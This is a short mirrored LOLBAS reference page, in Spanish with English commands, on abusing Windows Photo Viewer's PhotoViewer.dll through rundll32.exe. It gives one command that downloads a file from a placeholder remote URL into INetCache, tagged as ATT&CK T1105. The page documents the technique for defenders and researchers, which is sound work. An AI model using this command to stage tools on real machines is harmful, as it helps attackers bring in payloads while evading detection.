# LOLBAS: PhotoViewer.dll

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Download`

Windows Photo Viewer

## Comandos

### Download file from remote location.

Download · priv: User · T1105

```cmd
rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL}
```

Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL.

